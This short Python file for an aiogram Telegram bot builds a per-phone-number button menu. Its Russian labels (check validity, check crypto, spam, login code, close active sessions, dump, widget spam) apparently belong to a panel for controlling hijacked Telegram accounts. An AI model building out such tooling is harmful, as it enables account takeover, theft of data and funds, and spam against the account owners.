from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton


def service_kb(phone):
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton(text='🔎 Проверить валид',callback_data=f'check*{phone}'))
    kb.add(InlineKeyboardButton(text='💎 Проверить крипту',callback_data=f'crypto*{phone}'))
    kb.add(InlineKeyboardButton(text='📡 Спам',callback_data=f'spam*{phone}'))
    kb.add(InlineKeyboardButton(text='🔑 Код авторизации',callback_data=f'code*{phone}'))
    kb.add(InlineKeyboardButton(text='🛎 Закрыть активные сессии',callback_data=f'sessions_close*{phone}'))
    kb.add(InlineKeyboardButton(text='📥 Дамп',callback_data=f'damp*{phone}'))
    kb.add(InlineKeyboardButton(text='💌 Виджет-спам',callback_data=f'vspam*{phone}'))
    return kb